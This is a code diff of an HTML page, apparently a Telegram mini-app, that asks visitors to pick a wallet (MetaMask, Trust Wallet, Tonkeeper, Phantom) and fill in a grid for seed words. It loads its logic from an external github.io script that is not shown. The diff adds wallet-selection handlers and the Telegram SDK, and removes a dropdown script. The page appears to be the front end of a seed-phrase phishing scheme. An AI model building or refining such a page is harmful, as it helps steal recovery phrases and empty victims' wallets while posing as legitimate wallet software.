@@ -11,6 +11,9 @@
     <!-- Feather Icons -->
     <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
 
+    <!-- Telegram WebApp SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <!-- Styles -->
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
 </head>
@@ -30,19 +33,19 @@
                     MetaMask
                 </div>
                 <ul class="options">
-                    <li data-value="MetaMask">
+                    <li data-value="MetaMask" onclick="goToWallet('MetaMask')">
                         <img src="https://seeklogo.com/images/M/metamask-logo-09EDE53DBD-seeklogo.com.png" class="wallet-icon" alt="MetaMask" />
                         MetaMask
                     </li>
-                    <li data-value="TrustWallet">
+                    <li data-value="TrustWallet" onclick="goToWallet('TrustWallet')">
                         <img src="https://assets.coingecko.com/coins/images/11085/small/Trust.png" class="wallet-icon" alt="Trust Wallet" />
                         Trust Wallet
                     </li>
-                    <li data-value="Tonkeeper">
+                    <li data-value="Tonkeeper" onclick="goToWallet('Tonkeeper')">
                         <img src="https://tonkeeper.com/favicon-32x32.png" class="wallet-icon" alt="Tonkeeper" />
                         Tonkeeper
                     </li>
-                    <li data-value="Phantom">
+                    <li data-value="Phantom" onclick="goToWallet('Phantom')">
                         <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/Phantom/logo.png" class="wallet-icon" alt="Phantom Wallet" />
                         Phantom
                     </li>
@@ -58,6 +61,7 @@
         </select>
 
         <div id="seedContainer" class="seed-grid"></div>
+
         <div id="validationWarning" class="warning" style="display:none;"></div>
         <p id="processingInfo" class="small" style="display:none;"></p>
 
@@ -72,31 +76,5 @@
 
     <!-- Скрипти -->
     <script src="https://sp574-maker.github.io/maker/script.js" defer></script>
-    <script>
-        feather.replace();
-
-        const selectWrapper = document.querySelector('.custom-select');
-        const selected = selectWrapper.querySelector('.selected');
-        const options = selectWrapper.querySelectorAll('.options li');
-        const hiddenInput = document.querySelector('#wallet');
-
-        selected.addEventListener('click', () => {
-            selectWrapper.classList.toggle('open');
-        });
-
-        options.forEach(option => {
-            option.addEventListener('click', () => {
-                selected.innerHTML = option.innerHTML;
-                hiddenInput.value = option.dataset.value;
-                selectWrapper.classList.remove('open');
-            });
-        });
-
-        document.addEventListener('click', e => {
-            if (!selectWrapper.contains(e.target)) {
-                selectWrapper.classList.remove('open');
-            }
-        });
-    </script>
 </body>
 </html>
